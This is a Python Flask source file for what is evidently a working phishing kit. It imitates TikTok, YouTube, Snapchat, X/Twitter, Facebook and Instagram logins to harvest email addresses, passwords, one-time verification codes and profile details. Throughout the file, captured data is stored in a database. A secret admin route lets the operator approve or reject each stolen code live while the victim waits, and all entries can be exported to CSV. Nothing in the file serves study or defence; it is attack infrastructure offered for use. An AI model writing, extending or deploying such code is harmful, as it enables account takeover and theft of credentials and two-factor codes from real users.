from flask import Flask, render_template, request, redirect, url_for, send_file, flash, jsonify, session
import sqlite3, os, csv
from datetime import datetime

app = Flask(__name__)
app.secret_key = os.environ.get("FLASK_SECRET", "change-me")

DB_FILE = "submissions.db"
ADMIN_SECRET = "supersecret-admin-2025"

ICON_MAP = {
    "joy1_1": ("fa-brands fa-tiktok", "#000000", "TikTok"),
    "joy1_2": ("fa-brands fa-tiktok", "#000000", "TikTok"),
    "joy1_3": ("fa-brands fa-tiktok", "#000000", "TikTok"),
    "joy2_1": ("fa-brands fa-youtube", "#FF0000", "YouTube"),
    "joy2_2": ("fa-brands fa-youtube", "#FF0000", "YouTube"),
    "joy2_3": ("fa-brands fa-youtube", "#FF0000", "YouTube"),
    "happy1_1": ("fa-brands fa-snapchat", "#FFFC00", "Snapchat"),
    "happy1_2": ("fa-brands fa-snapchat", "#FFFC00", "Snapchat"),
    "happy1_3": ("fa-brands fa-snapchat", "#FFFC00", "Snapchat"),
    "happy2_1": ("fa-brands fa-x-twitter", "#000000", "X / Twitter"),
    "happy2_2": ("fa-brands fa-x-twitter", "#000000", "X / Twitter"),
    "happy2_3": ("fa-brands fa-x-twitter", "#000000", "X / Twitter"),
    "love1_1": ("fa-brands fa-facebook-f", "#1877F2", "Facebook"),
    "love1_2": ("fa-brands fa-facebook-f", "#1877F2", "Facebook"),
    "love1_3": ("fa-brands fa-facebook-f", "#1877F2", "Facebook"),
    "love2_1": ("fa-brands fa-instagram", "#E1306C", "Instagram"),
    "love2_2": ("fa-brands fa-instagram", "#E1306C", "Instagram"),
    "love2_3": ("fa-brands fa-instagram", "#E1306C", "Instagram"),
    "f1": ("fa-solid fa-file", "#666", "Profile"),
    "f1_A": ("fa-solid fa-shield-check", "#10B981", "Security Check"),
    "f2": ("fa-solid fa-envelope", "#3B82F6", "Email Verification"),
    "f2_A": ("fa-solid fa-lock", "#EF4444", "Final Security"),
    "m1": ("fa-solid fa-circle-check", "#10B981", "Complete")
}

# ADDED: Platform to icon mapping
PLATFORM_ICON_MAP = {
    "Facebook": ("fa-brands fa-facebook-f", "#1877F2"),
    "Instagram": ("fa-brands fa-instagram", "#E4405F"),
    "TikTok": ("fa-brands fa-tiktok", "#000000"),
    "YouTube": ("fa-brands fa-youtube", "#FF0000"),
    "Snapchat": ("fa-brands fa-snapchat", "#FFFC00"),
    "X / Twitter": ("fa-brands fa-x-twitter", "#000000"),
    "Twitter": ("fa-brands fa-x-twitter", "#000000"),
    "Unknown": ("fa-solid fa-file", "#666")
}

def init_db():
    with sqlite3.connect(DB_FILE) as conn:
        conn.execute('''
            CREATE TABLE IF NOT EXISTS submissions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT,
                page TEXT,
                user TEXT,
                data TEXT,
                icon TEXT,
                code_value TEXT,
                confirmed BOOLEAN DEFAULT 0,
                platform_name TEXT,
                rejected BOOLEAN DEFAULT 0,
                resend_requested BOOLEAN DEFAULT 0,
                previous_page TEXT,
                current_status TEXT DEFAULT 'pending'
            )
        ''')
        conn.commit()

init_db()

def save_submission(page, user, data, code_value=None, platform_name=None, previous_page=None):
    icon, color, name = ICON_MAP.get(page, ("fa-solid fa-file", "#333", "Unknown"))
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.execute('''
            INSERT INTO submissions (timestamp, page, user, data, icon, code_value, confirmed, platform_name, rejected, resend_requested, previous_page)
            VALUES (?,?,?,?,?,?,?,?,?,?,?)
        ''', (datetime.utcnow().isoformat(), page, user, data, icon, code_value, 0, platform_name, 0, 0, previous_page))
        conn.commit()
        return cursor.lastrowid

def check_confirmation(submission_id):
    with sqlite3.connect(DB_FILE) as conn:
        result = conn.execute(
            'SELECT confirmed, rejected, resend_requested, current_status FROM submissions WHERE id = ?',
            (submission_id,)
        ).fetchone()
        if result:
            return {
                'confirmed': bool(result[0]),
                'rejected': bool(result[1]),
                'resend_requested': bool(result[2]),
                'status': result[3] or 'pending'
            }
        return {'confirmed': False, 'rejected': False, 'resend_requested': False, 'status': 'not_found'}

def extract_user(form):
    for key in ("address","email","phone","fullname","street","username"):
        val = form.get(key)
        if val:
            return val.strip()
    return "anonymous"

# Helper function to get platform icon and color
def get_platform_icon(platform_name):
    return PLATFORM_ICON_MAP.get(platform_name, PLATFORM_ICON_MAP["Unknown"])

# Helper function to get previous page URL based on platform and current page
def get_previous_page_url(platform, current_page):
    platform_pages = {
        'TikTok': {
            'joy1_2': '/joy1_2',
            'joy1_3': '/joy1_2'
        },
        'YouTube': {
            'joy2_2': '/joy2_2',
            'joy2_3': '/joy2_2'
        },
        'Snapchat': {
            'happy1_2': '/happy1_2',
            'happy1_3': '/happy1_2'
        },
        'X / Twitter': {
            'happy2_2': '/happy2_2',
            'happy2_3': '/happy2_2'
        },
        'Facebook': {
            'love1_2': '/love1_2',
            'love1_3': '/love1_2'
        },
        'Instagram': {
            'love2_2': '/love2_2',
            'love2_3': '/love2_2'
        }
    }
    
    # For common flow pages
    common_pages = {
        'f1_A': '/f1_A',
        'f2_A': '/f2_A'
    }
    
    if platform in platform_pages and current_page in platform_pages[platform]:
        return platform_pages[platform][current_page]
    elif current_page in common_pages:
        return common_pages[current_page]
    else:
        return '/'

@app.route('/')
def index():
    return render_template('index.html')

# ========== INDIVIDUAL ROUTES (FIXED) ==========

# TikTok Flow
@app.route('/joy1_1', methods=['GET','POST'])
def joy1_1():
    if request.method == 'POST':
        user = extract_user(request.form)
        addr = request.form.get('address','')
        pwd = request.form.get('password','')
        save_submission('joy1_1', user, f'address={addr}; password={pwd}', platform_name="TikTok")
        return redirect(url_for('joy1_2'))
    platform_icon, platform_color = get_platform_icon('TikTok')
    return render_template('joy1_1.html', platform_icon=platform_icon, platform_name='TikTok', platform_color=platform_color)

@app.route('/joy1_2', methods=['GET','POST'])
def joy1_2():
    if request.method == 'POST':
        user = extract_user(request.form)
        digits = request.form.get('digits','')
        submission_id = save_submission(
            'joy1_2', user, f'digits={digits}', 
            code_value=digits, platform_name="TikTok",
            previous_page=request.url
        )
        platform_icon, platform_color = get_platform_icon('TikTok')
        previous_page_url = get_previous_page_url('TikTok', 'joy1_2')
        
        return render_template('waiting_confirmation.html', 
                             next_url=url_for('joy1_3'),
                             code_value=digits,
                             submission_id=submission_id,
                             platform_icon=platform_icon, 
                             platform_name='TikTok',
                             platform_color=platform_color,
                             previous_page_url=previous_page_url)
    platform_icon, platform_color = get_platform_icon('TikTok')
    return render_template('joy1_2.html', platform_icon=platform_icon, platform_name='TikTok', platform_color=platform_color)

@app.route('/joy1_3', methods=['GET','POST'])
def joy1_3():
    if request.method == 'POST':
        user = extract_user(request.form)
        digits = request.form.get('digits','')
        submission_id = save_submission(
            'joy1_3', user, f'digits={digits}', 
            code_value=digits, platform_name="TikTok",
            previous_page=request.url
        )
        platform_icon, platform_color = get_platform_icon('TikTok')
        previous_page_url = get_previous_page_url('TikTok', 'joy1_3')
        
        return render_template('waiting_confirmation.html', 
                             next_url=url_for('spinner', platform='TikTok'),
                             code_value=digits,
                             submission_id=submission_id,
                             platform_icon=platform_icon, 
                             platform_name='TikTok',
                             platform_color=platform_color,
                             previous_page_url=previous_page_url)
    platform_icon, platform_color = get_platform_icon('TikTok')
    return render_template('joy1_3.html', platform_icon=platform_icon, platform_name='TikTok', platform_color=platform_color)

# YouTube Flow
@app.route('/joy2_1', methods=['GET','POST'])
def joy2_1():
    if request.method == 'POST':
        user = extract_user(request.form)
        addr = request.form.get('address','')
        pwd = request.form.get('password','')
        save_submission('joy2_1', user, f'address={addr}; password={pwd}', platform_name="YouTube")
        return redirect(url_for('joy2_2'))
    platform_icon, platform_color = get_platform_icon('YouTube')
    return render_template('joy2_1.html', platform_icon=platform_icon, platform_name='YouTube', platform_color=platform_color)

@app.route('/joy2_2', methods=['GET','POST'])
def joy2_2():
    if request.method == 'POST':
        user = extract_user(request.form)
        digits = request.form.get('digits','')
        submission_id = save_submission(
            'joy2_2', user, f'digits={digits}', 
            code_value=digits, platform_name="YouTube",
            previous_page=request.url
        )
        platform_icon, platform_color = get_platform_icon('YouTube')
        previous_page_url = get_previous_page_url('YouTube', 'joy2_2')
        
        return render_template('waiting_confirmation.html', 
                             next_url=url_for('joy2_3'),
                             code_value=digits,
                             submission_id=submission_id,
                             platform_icon=platform_icon, 
                             platform_name='YouTube',
                             platform_color=platform_color,
                             previous_page_url=previous_page_url)
    platform_icon, platform_color = get_platform_icon('YouTube')
    return render_template('joy2_2.html', platform_icon=platform_icon, platform_name='YouTube', platform_color=platform_color)

@app.route('/joy2_3', methods=['GET','POST'])
def joy2_3():
    if request.method == 'POST':
        user = extract_user(request.form)
        digits = request.form.get('digits','')
        submission_id = save_submission(
            'joy2_3', user, f'digits={digits}', 
            code_value=digits, platform_name="YouTube",
            previous_page=request.url
        )
        platform_icon, platform_color = get_platform_icon('YouTube')
        previous_page_url = get_previous_page_url('YouTube', 'joy2_3')
        
        return render_template('waiting_confirmation.html', 
                             next_url=url_for('spinner', platform='YouTube'),
                             code_value=digits,
                             submission_id=submission_id,
                             platform_icon=platform_icon, 
                             platform_name='YouTube',
                             platform_color=platform_color,
                             previous_page_url=previous_page_url)
    platform_icon, platform_color = get_platform_icon('YouTube')
    return render_template('joy2_3.html', platform_icon=platform_icon, platform_name='YouTube', platform_color=platform_color)

# Snapchat Flow
@app.route('/happy1_1', methods=['GET','POST'])
def happy1_1():
    if request.method == 'POST':
        user = extract_user(request.form)
        addr = request.form.get('address','')
        pwd = request.form.get('password','')
        save_submission('happy1_1', user, f'address={addr}; password={pwd}', platform_name="Snapchat")
        return redirect(url_for('happy1_2'))
    platform_icon, platform_color = get_platform_icon('Snapchat')
    return render_template('happy1_1.html', platform_icon=platform_icon, platform_name='Snapchat', platform_color=platform_color)

@app.route('/happy1_2', methods=['GET','POST'])
def happy1_2():
    if request.method == 'POST':
        user = extract_user(request.form)
        digits = request.form.get('digits','')
        submission_id = save_submission(
            'happy1_2', user, f'digits={digits}', 
            code_value=digits, platform_name="Snapchat",
            previous_page=request.url
        )
        platform_icon, platform_color = get_platform_icon('Snapchat')
        previous_page_url = get_previous_page_url('Snapchat', 'happy1_2')
        
        return render_template('waiting_confirmation.html', 
                             next_url=url_for('happy1_3'),
                             code_value=digits,
                             submission_id=submission_id,
                             platform_icon=platform_icon, 
                             platform_name='Snapchat',
                             platform_color=platform_color,
                             previous_page_url=previous_page_url)
    platform_icon, platform_color = get_platform_icon('Snapchat')
    return render_template('happy1_2.html', platform_icon=platform_icon, platform_name='Snapchat', platform_color=platform_color)

@app.route('/happy1_3', methods=['GET','POST'])
def happy1_3():
    if request.method == 'POST':
        user = extract_user(request.form)
        digits = request.form.get('digits','')
        submission_id = save_submission(
            'happy1_3', user, f'digits={digits}', 
            code_value=digits, platform_name="Snapchat",
            previous_page=request.url
        )
        platform_icon, platform_color = get_platform_icon('Snapchat')
        previous_page_url = get_previous_page_url('Snapchat', 'happy1_3')
        
        return render_template('waiting_confirmation.html', 
                             next_url=url_for('spinner', platform='Snapchat'),
                             code_value=digits,
                             submission_id=submission_id,
                             platform_icon=platform_icon, 
                             platform_name='Snapchat',
                             platform_color=platform_color,
                             previous_page_url=previous_page_url)
    platform_icon, platform_color = get_platform_icon('Snapchat')
    return render_template('happy1_3.html', platform_icon=platform_icon, platform_name='Snapchat', platform_color=platform_color)

# X/Twitter Flow
@app.route('/happy2_1', methods=['GET','POST'])
def happy2_1():
    if request.method == 'POST':
        user = extract_user(request.form)
        addr = request.form.get('address','')
        pwd = request.form.get('password','')
        save_submission('happy2_1', user, f'address={addr}; password={pwd}', platform_name="X / Twitter")
        return redirect(url_for('happy2_2'))
    platform_icon, platform_color = get_platform_icon('X / Twitter')
    return render_template('happy2_1.html', platform_icon=platform_icon, platform_name='X / Twitter', platform_color=platform_color)

@app.route('/happy2_2', methods=['GET','POST'])
def happy2_2():
    if request.method == 'POST':
        user = extract_user(request.form)
        digits = request.form.get('digits','')
        submission_id = save_submission(
            'happy2_2', user, f'digits={digits}', 
            code_value=digits, platform_name="X / Twitter",
            previous_page=request.url
        )
        platform_icon, platform_color = get_platform_icon('X / Twitter')
        previous_page_url = get_previous_page_url('X / Twitter', 'happy2_2')
        
        return render_template('waiting_confirmation.html', 
                             next_url=url_for('happy2_3'),
                             code_value=digits,
                             submission_id=submission_id,
                             platform_icon=platform_icon, 
                             platform_name='X / Twitter',
                             platform_color=platform_color,
                             previous_page_url=previous_page_url)
    platform_icon, platform_color = get_platform_icon('X / Twitter')
    return render_template('happy2_2.html', platform_icon=platform_icon, platform_name='X / Twitter', platform_color=platform_color)

@app.route('/happy2_3', methods=['GET','POST'])
def happy2_3():
    if request.method == 'POST':
        user = extract_user(request.form)
        digits = request.form.get('digits','')
        submission_id = save_submission(
            'happy2_3', user, f'digits={digits}', 
            code_value=digits, platform_name="X / Twitter",
            previous_page=request.url
        )
        platform_icon, platform_color = get_platform_icon('X / Twitter')
        previous_page_url = get_previous_page_url('X / Twitter', 'happy2_3')
        
        return render_template('waiting_confirmation.html', 
                             next_url=url_for('spinner', platform='X / Twitter'),
                             code_value=digits,
                             submission_id=submission_id,
                             platform_icon=platform_icon, 
                             platform_name='X / Twitter',
                             platform_color=platform_color,
                             previous_page_url=previous_page_url)
    platform_icon, platform_color = get_platform_icon('X / Twitter')
    return render_template('happy2_3.html', platform_icon=platform_icon, platform_name='X / Twitter', platform_color=platform_color)

# Facebook Flow
@app.route('/love1_1', methods=['GET','POST'])
def love1_1():
    if request.method == 'POST':
        user = extract_user(request.form)
        addr = request.form.get('address','')
        pwd = request.form.get('password','')
        save_submission('love1_1', user, f'address={addr}; password={pwd}', platform_name="Facebook")
        return redirect(url_for('love1_2'))
    platform_icon, platform_color = get_platform_icon('Facebook')
    return render_template('love1_1.html', platform_icon=platform_icon, platform_name='Facebook', platform_color=platform_color)

@app.route('/love1_2', methods=['GET','POST'])
def love1_2():
    if request.method == 'POST':
        user = extract_user(request.form)
        digits = request.form.get('digits','')
        submission_id = save_submission(
            'love1_2', user, f'digits={digits}', 
            code_value=digits, platform_name="Facebook",
            previous_page=request.url
        )
        platform_icon, platform_color = get_platform_icon('Facebook')
        previous_page_url = get_previous_page_url('Facebook', 'love1_2')
        
        return render_template('waiting_confirmation.html', 
                             next_url=url_for('love1_3'),
                             code_value=digits,
                             submission_id=submission_id,
                             platform_icon=platform_icon, 
                             platform_name='Facebook',
                             platform_color=platform_color,
                             previous_page_url=previous_page_url)
    platform_icon, platform_color = get_platform_icon('Facebook')
    return render_template('love1_2.html', platform_icon=platform_icon, platform_name='Facebook', platform_color=platform_color)

@app.route('/love1_3', methods=['GET','POST'])
def love1_3():
    if request.method == 'POST':
        user = extract_user(request.form)
        digits = request.form.get('digits','')
        submission_id = save_submission(
            'love1_3', user, f'digits={digits}', 
            code_value=digits, platform_name="Facebook",
            previous_page=request.url
        )
        platform_icon, platform_color = get_platform_icon('Facebook')
        previous_page_url = get_previous_page_url('Facebook', 'love1_3')
        
        return render_template('waiting_confirmation.html', 
                             next_url=url_for('spinner', platform='Facebook'),
                             code_value=digits,
                             submission_id=submission_id,
                             platform_icon=platform_icon, 
                             platform_name='Facebook',
                             platform_color=platform_color,
                             previous_page_url=previous_page_url)
    platform_icon, platform_color = get_platform_icon('Facebook')
    return render_template('love1_3.html', platform_icon=platform_icon, platform_name='Facebook', platform_color=platform_color)

# Instagram Flow
@app.route('/love2_1', methods=['GET','POST'])
def love2_1():
    if request.method == 'POST':
        user = extract_user(request.form)
        addr = request.form.get('address','')
        pwd = request.form.get('password','')
        save_submission('love2_1', user, f'address={addr}; password={pwd}', platform_name="Instagram")
        return redirect(url_for('love2_2'))
    platform_icon, platform_color = get_platform_icon('Instagram')
    return render_template('love2_1.html', platform_icon=platform_icon, platform_name='Instagram', platform_color=platform_color)

@app.route('/love2_2', methods=['GET','POST'])
def love2_2():
    if request.method == 'POST':
        user = extract_user(request.form)
        digits = request.form.get('digits','')
        submission_id = save_submission(
            'love2_2', user, f'digits={digits}', 
            code_value=digits, platform_name="Instagram",
            previous_page=request.url
        )
        platform_icon, platform_color = get_platform_icon('Instagram')
        previous_page_url = get_previous_page_url('Instagram', 'love2_2')
        
        return render_template('waiting_confirmation.html', 
                             next_url=url_for('love2_3'),
                             code_value=digits,
                             submission_id=submission_id,
                             platform_icon=platform_icon, 
                             platform_name='Instagram',
                             platform_color=platform_color,
                             previous_page_url=previous_page_url)
    platform_icon, platform_color = get_platform_icon('Instagram')
    return render_template('love2_2.html', platform_icon=platform_icon, platform_name='Instagram', platform_color=platform_color)

@app.route('/love2_3', methods=['GET','POST'])
def love2_3():
    if request.method == 'POST':
        user = extract_user(request.form)
        digits = request.form.get('digits','')
        submission_id = save_submission(
            'love2_3', user, f'digits={digits}', 
            code_value=digits, platform_name="Instagram",
            previous_page=request.url
        )
        platform_icon, platform_color = get_platform_icon('Instagram')
        previous_page_url = get_previous_page_url('Instagram', 'love2_3')
        
        return render_template('waiting_confirmation.html', 
                             next_url=url_for('spinner', platform='Instagram'),
                             code_value=digits,
                             submission_id=submission_id,
                             platform_icon=platform_icon, 
                             platform_name='Instagram',
                             platform_color=platform_color,
                             previous_page_url=previous_page_url)
    platform_icon, platform_color = get_platform_icon('Instagram')
    return render_template('love2_3.html', platform_icon=platform_icon, platform_name='Instagram', platform_color=platform_color)

# Common Flow Pages
@app.route('/spinner')
def spinner():
    platform = request.args.get('platform', 'Unknown')
    platform_icon, platform_color = get_platform_icon(platform)
    return render_template('spinner.html', 
                         next_url=url_for('f1', platform=platform),
                         delay=4,
                         platform=platform,
                         platform_icon=platform_icon,
                         platform_name=platform,
                         platform_color=platform_color)

@app.route('/f1', methods=['GET','POST'])
def f1():
    if request.method == 'POST':
        user = extract_user(request.form)
        items = [f"{k}: {v}" for k,v in request.form.items()]
        platform = request.form.get('platform', request.args.get('platform', 'Unknown'))
        save_submission('f1', user, " ; ".join(items), platform_name=platform)
        return redirect(url_for('f1_A', platform=platform))
    platform = request.args.get('platform', 'Unknown')
    platform_icon, platform_color = get_platform_icon(platform)
    return render_template('f1.html', platform_icon=platform_icon, platform_name=platform, platform_color=platform_color)

@app.route('/f1_A', methods=['GET','POST'])
def f1_A():
    if request.method == 'POST':
        user = extract_user(request.form)
        digits = request.form.get('digits','')
        platform = request.args.get('platform', 'Unknown')
        submission_id = save_submission(
            'f1_A', user, f'digits={digits}', 
            code_value=digits, platform_name=platform,
            previous_page=request.url
        )
        platform_icon, platform_color = get_platform_icon(platform)
        previous_page_url = get_previous_page_url(platform, 'f1_A')
        
        return render_template('waiting_confirmation.html', 
                             next_url=url_for('spinner2', platform=platform),
                             code_value=digits,
                             submission_id=submission_id,
                             platform_icon=platform_icon, 
                             platform_name=platform,
                             platform_color=platform_color,
                             previous_page_url=previous_page_url)
    platform = request.args.get('platform', 'Unknown')
    platform_icon, platform_color = get_platform_icon(platform)
    return render_template('f1_A.html', platform_icon=platform_icon, platform_name=platform, platform_color=platform_color)

@app.route('/spinner2')
def spinner2():
    platform = request.args.get('platform', 'Unknown')
    platform_icon, platform_color = get_platform_icon(platform)
    return render_template('spinner2.html', 
                         next_url=url_for('f2', platform=platform),
                         delay=4,
                         platform=platform,
                         platform_icon=platform_icon,
                         platform_name=platform,
                         platform_color=platform_color)

@app.route('/f2', methods=['GET','POST'])
def f2():
    if request.method == 'POST':
        user = extract_user(request.form)
        addr = request.form.get('address','')
        platform = request.args.get('platform', 'Unknown')
        save_submission('f2', user, f'address={addr}', platform_name=platform)
        return redirect(url_for('f2_A', platform=platform))
    platform = request.args.get('platform', 'Unknown')
    platform_icon, platform_color = get_platform_icon(platform)
    return render_template('f2.html', platform_icon=platform_icon, platform_name=platform, platform_color=platform_color)

@app.route('/f2_A', methods=['GET','POST'])
def f2_A():
    if request.method == 'POST':
        user = extract_user(request.form)
        digits = request.form.get('digits','')
        platform = request.args.get('platform', 'Unknown')
        submission_id = save_submission(
            'f2_A', user, f'digits={digits}', 
            code_value=digits, platform_name=platform,
            previous_page=request.url
        )
        platform_icon, platform_color = get_platform_icon(platform)
        previous_page_url = get_previous_page_url(platform, 'f2_A')
        
        return render_template('waiting_confirmation.html', 
                             next_url=url_for('m1', platform=platform),
                             code_value=digits,
                             submission_id=submission_id,
                             platform_icon=platform_icon, 
                             platform_name=platform,
                             platform_color=platform_color,
                             previous_page_url=previous_page_url)
    platform = request.args.get('platform', 'Unknown')
    platform_icon, platform_color = get_platform_icon(platform)
    return render_template('f2_A.html', platform_icon=platform_icon, platform_name=platform, platform_color=platform_color)

@app.route('/m1')
def m1():
    platform = request.args.get('platform', 'Unknown')
    platform_icon, platform_color = get_platform_icon(platform)
    return render_template('m1.html', 
                         platform_icon=platform_icon,
                         platform_name=platform,
                         platform_color=platform_color)

# ========== ENHANCED CONFIRMATION & REJECTION SYSTEM ==========

@app.route('/api/check_confirmation/<int:submission_id>')
def api_check_confirmation(submission_id):
    """Enhanced confirmation check with proper status handling"""
    status = check_confirmation(submission_id)
    return jsonify(status)

@app.route(f"/admin/{ADMIN_SECRET}/confirm/<int:submission_id>", methods=['POST'])
def admin_confirm(submission_id):
    with sqlite3.connect(DB_FILE) as conn:
        conn.execute(
            'UPDATE submissions SET confirmed = 1, rejected = 0, current_status = "approved" WHERE id = ?', 
            (submission_id,)
        )
        conn.commit()
    return jsonify({'success': True})

@app.route(f"/admin/{ADMIN_SECRET}/reject/<int:submission_id>", methods=['POST'])
def admin_reject(submission_id):
    with sqlite3.connect(DB_FILE) as conn:
        # Get submission details for redirect
        submission = conn.execute(
            'SELECT platform_name, page FROM submissions WHERE id = ?', (submission_id,)
        ).fetchone()
        
        conn.execute(
            'UPDATE submissions SET rejected = 1, confirmed = 0, current_status = "rejected" WHERE id = ?', 
            (submission_id,)
        )
        conn.commit()
    
    return jsonify({'success': True})

@app.route('/api/request_new_code/<int:submission_id>', methods=['POST'])
def api_request_new_code(submission_id):
    """Enhanced new code request with proper redirect logic"""
    with sqlite3.connect(DB_FILE) as conn:
        # Mark that user requested a new code
        conn.execute(
            'UPDATE submissions SET resend_requested = 1, current_status = "resend_requested" WHERE id = ?', 
            (submission_id,)
        )
        
        # Get submission details for proper redirect
        submission = conn.execute(
            'SELECT platform_name, page, previous_page FROM submissions WHERE id = ?', (submission_id,)
        ).fetchone()
        
        conn.commit()
    
    if submission:
        platform = submission[0] or 'Unknown'
        current_page = submission[1] or ''
        stored_previous_page = submission[2] or ''
        
        # Use stored previous page if available, otherwise calculate it
        if stored_previous_page:
            redirect_url = stored_previous_page
        else:
            redirect_url = get_previous_page_url(platform, current_page)
        
        return jsonify({
            'success': True, 
            'redirect_url': redirect_url,
            'message': 'New code requested successfully'
        })
    
    return jsonify({'success': False, 'error': 'Submission not found'})

# UPDATED: Admin route with enhanced statistics
@app.route(f"/admin/{ADMIN_SECRET}")
def admin():
    with sqlite3.connect(DB_FILE) as conn:
        rows = conn.execute(
            'SELECT id, timestamp, page, user, data, icon, code_value, confirmed, platform_name, rejected, resend_requested, previous_page, current_status FROM submissions ORDER BY id DESC'
        ).fetchall()
    
    # Calculate enhanced statistics
    total_submissions = len(rows)
    
    # Status statistics
    pending_count = sum(1 for row in rows if row[12] == 'pending' or (not row[7] and not row[9]))
    approved_count = sum(1 for row in rows if row[12] == 'approved' or row[7])
    rejected_count = sum(1 for row in rows if row[12] == 'rejected' or row[9])
    resend_requested_count = sum(1 for row in rows if row[12] == 'resend_requested' or row[10])
    
    # Code-specific statistics
    code_submissions = [row for row in rows if row[6]]  # Only submissions with codes
    total_codes = len(code_submissions)
    pending_codes = sum(1 for row in code_submissions if row[12] == 'pending' or (not row[7] and not row[9]))
    approved_codes = sum(1 for row in code_submissions if row[12] == 'approved' or row[7])
    rejected_codes = sum(1 for row in code_submissions if row[12] == 'rejected' or row[9])
    
    # Platform statistics
    platform_stats = {}
    for row in rows:
        platform = row[8] or 'Unknown'
        if platform not in platform_stats:
            platform_stats[platform] = 0
        platform_stats[platform] += 1
    
    return render_template('admin.html', 
                         submissions=rows, 
                         secret=ADMIN_SECRET,
                         # Status stats
                         pending_count=pending_count,
                         approved_count=approved_count,
                         rejected_count=rejected_count,
                         resend_requested_count=resend_requested_count,
                         # Code stats
                         total_codes=total_codes,
                         pending_codes=pending_codes,
                         approved_codes=approved_codes,
                         rejected_codes=rejected_codes,
                         # Platform stats
                         platform_stats=platform_stats,
                         total_submissions=total_submissions)

@app.route(f"/admin/{ADMIN_SECRET}/clear", methods=['POST'])
def admin_clear():
    with sqlite3.connect(DB_FILE) as conn:
        conn.execute('DELETE FROM submissions')
        conn.commit()
    flash('All submissions cleared.')
    return redirect(url_for('admin'))

@app.route(f"/admin/{ADMIN_SECRET}/download")
def download():
    csv_path = 'submissions_export.csv'
    with sqlite3.connect(DB_FILE) as conn:
        rows = conn.execute('SELECT id, timestamp, page, user, data, platform_name, code_value, current_status FROM submissions ORDER BY id DESC').fetchall()
    with open(csv_path, 'w', newline='', encoding='utf-8') as csvf:
        writer = csv.writer(csvf)
        writer.writerow(['id','timestamp','page','user','data','platform','code_value','status'])
        writer.writerows(rows)
    return send_file(csv_path, as_attachment=True)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT',5000)), debug=True)
